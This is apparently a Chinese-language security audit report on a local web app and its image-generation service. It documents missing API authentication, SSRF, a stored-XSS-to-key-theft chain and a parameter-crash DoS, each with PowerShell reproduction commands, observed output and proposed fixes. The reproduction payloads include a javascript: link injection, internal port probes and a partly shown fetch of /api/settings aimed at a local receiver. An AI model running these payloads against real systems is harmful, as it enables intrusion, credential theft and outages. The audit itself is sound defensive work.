### H1 [High] 全部 `/api` 路由无认证与授权检查

- **位置**：`app/server.mjs` 路由分发（约 L1927-1945），所有 `on(...)` 注册的 handler 无认证中间件
- **复现命令**（无任何 token/cookie，均 200）：
  ```powershell
  Invoke-WebRequest 'http://127.0.0.1:8795/api/overview' -UseBasicParsing
  Invoke-WebRequest 'http://127.0.0.1:8795/api/accounts' -UseBasicParsing
  Invoke-WebRequest 'http://127.0.0.1:8795/api/ledger'  -UseBasicParsing
  ```
- **真实输出**：
  - `/api/overview` → 200 `{"counts":{"accounts":5,"products":8,...},"gateway":{"ok":true,"models":[...]}}`
  - `/api/accounts` → 200（1447 字节，含全部账号）
  - `/api/ledger` → 200（1580 字节，含完整台账）
  - 源码 `grep -iE 'authorization|bearer|session|login'` 命中的行均为第三方 fetch 的 `authorization` 头，**无一处是本服务对入站请求的鉴权**。
- **影响**：服务绑定 `127.0.0.1`（`server.mjs:18` 读 `SWB_HOST`，默认回环），任何本地进程、或经浏览器对 localhost 的跨站请求（CSRF/DNS rebinding），均可读写**全部**数据（账号、产品、内容、设置、台账），含写入与删除。
- **修复位置**：在路由分发入口（L1927 附近）加统一鉴权中间件（token/会话校验）；写操作加 CSRF 防护。
- **当前状态**：❌ 未修复。

### H2 [High] 服务端 SSRF（`/api/models/test`、产品落地页可达性探测、博客导入、竞品探测）

- **位置**：`app/server.mjs:329`（`POST /api/models/test` → `testEndpoint(b.base_url, ...)`）；`app/server.mjs:58-71`（`assertReachable(url)` → `fetch(url)`，被 L336/344 产品创建/更新触发）；`app/server.mjs:1025-1034`（`/api/radar/competitor` → `probeCompetitor(domain)`）；`app/server.mjs:1499-1505`（博客导入 `fetch(url)`，仅校验 `^https?://`）
- **复现命令**：
  ```powershell
  # 1) 触达内网存活网关 8787
  Invoke-WebRequest 'http://127.0.0.1:8795/api/models/test' -Method POST -ContentType 'application/json' -Body '{"base_url":"http://127.0.0.1:8787/v1","model":"x"}'
  # 2) 探测关闭端口 5000（区分存活）
  Invoke-WebRequest 'http://127.0.0.1:8795/api/models/test' -Method POST -ContentType 'application/json' -Body '{"base_url":"http://127.0.0.1:5000/v1","model":"x"}'
  ```
- **真实输出**：
  - 命令 1 → 200 `{"ok":true,"models":["route/auto","deepseek-v4.1-flash","glm-5.3",...]}`（成功读回内网网关模型列表）

- **影响**：攻击者可用不同 `base_url`/`url`/`domain` 按响应差异探测内网主机与端口存活，读取内网 HTTP 服务内容。

- **补充**：`GET /api/thumb`（`server.mjs:2009-2025`）仅允许 `https:`（L2013 `if (target.protocol !== 'https:') throw`），但仍可指向任意 https 内网地址，为同类 SSRF 面，审计期未实测（源码审查）。
- **当前状态**：❌ 未修复。

### H3 [High] 组合利用链：accounts 存储型 XSS → 无鉴权密钥读取 → 无鉴权 SD 推理（端到端未闭环）

- **位置**：
  - 存储：`app/server.mjs:196-201`（`POST /api/accounts` 对 `profile_url` 原样入库，无协议/内容过滤）
  - 渲染：`web/app.js:4`（`esc()` 仅转义 `& < > " '`，**不转义冒号**）；`web/app.js:1183-1198`（`accountUrl()` 直接返回 `a.profile_url`）；`web/app.js:1221`（`href="${esc(accountUrl(a))}" target="_blank"`）
  - 密钥：`GET /api/settings`（见 C1）
  - SD：`service/sd_server.py:65-111`（`POST /generate` 无鉴权，见 M2）
- **复现命令**：
  ```powershell
  Invoke-WebRequest 'http://127.0.0.1:8795/api/accounts' -Method POST -ContentType 'application/json' -Body '{"platform":"linkedin","handle":"@auditxss","profile_url":"javascript:alert(document.domain)"}'
  Invoke-WebRequest 'http://127.0.0.1:8795/api/accounts' -UseBasicParsing
  ```
- **真实输出**：
  - 写入 → 200 `{"id":8}`
  - 回读 → 账号记录中 `profile_url = "javascript:alert(document.domain)"` 原样存储（未拒绝）
  - Node 实测 `esc("javascript:alert(document.domain)")` = 原样（`javascript:` 未被转义）
- **影响**：受害者在 accounts 页点击该「打开主页」链接，即可在浏览器同源上下文执行任意 JS；叠加 H1（无鉴权）可读密钥、调 SD，构成「恶意账户主页链接 → 读取密钥 → 调用本机 GPU 出图」链。
- **端到端实测结论（重要，勿将推断当实测）**：
  - ✅ **已闭环验证的环节**：XSS 触发点（Playwright 实测 `href` 完整以 `javascript:fetch('/api/settings')...` 开头，为 accounts 视图 24 个链接中唯一 javascript: 链接）；密钥读取接口可访问；sd_server 真实 CUDA 推理可触发（`{"ok":true,"ms":2873,"name":"sdx-1794217935049.png"}`，RTX 3060 6GB）。
  - ❌ **未闭环的环节**：点击后**自动窃取密钥并回传**。根因 `target="_blank"` 使 javascript: 在 `about:blank` 新窗口执行，payload 中的相对路径 `fetch('/api/settings')` 无 base 解析而抛错，接收端 `127.0.0.1:7777` 仅记录到 `/ping`，未收到密钥。
  - ⚠️ 攻击链**仍成立**的绕开方式（未在本轮实测）：payload 改用绝对 URL `http://127.0.0.1:8795/api/settings`，或在无 `target="_blank"` 的同页上下文执行。
- **修复位置**：服务端 `POST/PATCH /api/accounts` 对 `profile_url` 强制 `^https?://` 且协议白名单；前端 `esc()` 改为对 `href` 输出做协议校验（拒绝 `javascript:`/`data:`/`vbscript:`）；账户页「打开主页」移除 `target="_blank"` 或改为 `rel="noopener noreferrer"` + 协议白名单。
- **当前状态**：❌ 未修复（存储与渲染链仍原样）。

### M3 [Medium] sd_server `/generate` 参数强转未捕获异常 → 请求处理线程崩溃（DoS）

- **位置**：`service/sd_server.py:78-89`（`width = int(req.get("width") or 512)` 等强转在 `try` 块之外）
- **复现命令**：
  ```powershell
  Invoke-WebRequest 'http://127.0.0.1:8189/generate' -Method POST -ContentType 'application/json' -Body '{"prompt":"a cat","width":"abc"}'
  ```
- **真实输出**：客户端收到 `RemoteDisconnected: Remote end closed connection without response`；服务端 stderr 打印完整 traceback：`sd_server.py line 78 ... width = int(req.get("width") or 512)` / `ValueError: invalid literal for int() with base 10: 'abc'`。同类 `steps="bad"` 命中 L87 同样崩溃。
- **影响**：单个畸形参数即可使请求处理线程抛未捕获 ValueError，连接被直接关闭；重复可造成线程反复崩溃。仅 JSON 解析层（L69-72）有 try，参数强转层无保护。
- **修复位置**：把 L78-89 的强转包进 try，或对每个参数用安全的 `int_or_default()`。
- **当前状态**：❌ 未修复。
